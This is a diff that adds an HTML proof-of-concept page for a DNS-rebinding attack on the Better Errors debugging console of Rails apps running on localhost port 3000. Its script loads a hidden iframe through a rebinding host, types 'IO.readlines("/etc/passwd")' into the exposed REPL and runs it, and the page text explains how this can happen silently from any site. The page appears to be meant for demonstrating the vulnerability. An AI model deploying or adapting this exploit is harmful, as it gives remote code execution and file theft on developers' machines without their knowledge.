@@ -1,0 +1,86 @@
+<html>
+  <head>
+    <title>Better Errors - Local RCE</title>
+    <script>
+      function __exploitBetterErrors() {
+        // Setup Iframe
+        const ifrm = document.createElement('iframe');
+        window.__betterErrorsExplotFrame = ifrm;
+        ifrm.src = 'http://22e98617.7f000001.rbndr.us:3000/accounts/999999999999999999';
+        ifrm.setAttribute('style', 'display: none;');
+        window.__betterErrorsExplotFrame.addEventListener("load", function() {
+          var elem = window.__betterErrorsExplotFrame.contentDocument.querySelector('.backtrace');
+          if (elem == null) {
+            console.log('refresh');
+            window.__betterErrorsExplotFrame.contentWindow.location.reload();
+            return;
+          }
+
+          /// Wait for content to render.
+          setTimeout(function() {
+            var repl = window.__betterErrorsExplotFrame.contentDocument.querySelector('.command-line');
+            if (!repl) {
+              heading.textContent = "We got a better errors page, but no repl was present. Bailing...";
+              return;
+            }
+
+            var input = repl.getElementsByTagName('input')[0];
+            if (!input) {
+              heading.textContent = "Found REPL, but didn't find input to REPL. Bailing...";
+              return;
+            }
+            input.value = 'IO.readlines("/etc/passwd")';
+          
+            var ev = window.__betterErrorsExplotFrame.contentDocument.createEvent('Event');
+            ev.initEvent('keydown');
+            ev.which = ev.keyCode = 13;
+            input.dispatchEvent(ev);
+
+            var content = window.__betterErrorsExplotFrame.contentDocument.querySelector('.be-console').querySelector('pre');
+            heading.textContent = 'Check your console!';
+            console.log(content);
+          }, 5000);
+        });
+        document.querySelector('#insertTo').parentElement.appendChild(ifrm);
+
+        const heading = document.createElement('h1');
+        heading.textContent = 'Attempting Exploit....';
+        document.querySelector('#explanation').setAttribute('style', 'display: none;');
+        document.querySelector('#insertTo').parentElement.appendChild(heading);
+      }
+    </script>
+  </head>
+  <body>
+    <div id="explanation">
+      <p>
+        This is a POC Site to demonstrate how entirely in the background we can harvest you're entire <code>/etc/passwd</code> file. Even if
+        your domain is set to only trust localhost. This attack is built ontop of a techinque called DNS rebinding that allows a remote web server to
+        make ajax requests to a local domain.
+      </p>
+      <br />
+      <p>
+        This attack may take awhile, but will be performed entirely in the background using a single iframe.
+        The attack essentially works as follows:
+        <ol>
+          <li>Load an iframe over and over again until we get one request that DNS Rebinds to localhost at a better errors page that generates an error.</li>
+          <li>Once we've got an iframe pointing to localhost, but under our domain we can then execute commands with the built in console.</li>
+        </ol>
+      </p>
+      <br />
+      <p>
+        It should be noted this attack has only been tested on firefox/chrome. We don't target cross browser compatibility here because it's just a POC.
+      </p>
+      <br />
+      <p>
+        Because we hide the iframe this happens entirely in the background, and could happen on any site. The only knowledge an attacker would need
+        is the port we're running our Rails App on. Since this is generally `3000`, and very few people change it, we can be almost positive if we just
+        set that.
+      </p>
+      <br />
+      <button onclick="__exploitBetterErrors()">
+        Attempt Exploit
+      </button>
+    </div>
+    <div id="insertTo" />
+  </body>
+</html>
